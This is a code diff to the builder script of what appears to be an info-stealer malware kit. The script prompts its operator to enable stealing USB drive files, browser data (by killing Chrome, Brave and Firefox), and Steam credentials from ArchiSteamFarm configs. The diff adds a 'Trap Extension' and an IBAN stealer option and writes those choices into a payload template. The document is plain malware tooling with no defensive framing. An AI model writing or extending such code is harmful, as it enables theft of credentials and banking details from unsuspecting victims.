@@ -150,6 +150,10 @@ while True:
     Drive = get_boolean_input('Steal all connected USB files (may make the stealer slower) Y/N: ')
     Kill_process = get_boolean_input('kill process (chrome, brave, firefox, to steal at 100%) Y/N: ')
     ArchiStealer = get_boolean_input('Want to steal all config files (retrieve all steam password and username found in ArchiSteamFarm) Y/N: ')
+    Trap_Extension = get_boolean_input('Enable Trap Extension (Extension for Trap such as IBAN Stealer, and more !) Y/N: ')
+    
+    if Trap_Extension == True:
+        Iban_Stealer = get_boolean_input('Enable Iban Stealer (Trap Extension (Only Py File))  Y/N: ')
 
     if change:
         bio = input(r'''Input the text you want the user to have in his about me (Right-click to paste) or put \n to skip a line -> ''')
@@ -215,6 +219,8 @@ while True:
     new_content = new_content.replace("'%Drive%'", str(Drive))
     new_content = new_content.replace("'%CloseProc%'", str(Kill_process))
     new_content = new_content.replace("'%ArchiStealer%'", str(ArchiStealer))
+    new_content = new_content.replace("'%IbanStealer%'", str(Iban_Stealer))
+    new_content = new_content.replace("'%TrapExtension%'", str(Trap_Extension))
 
     
     if change:
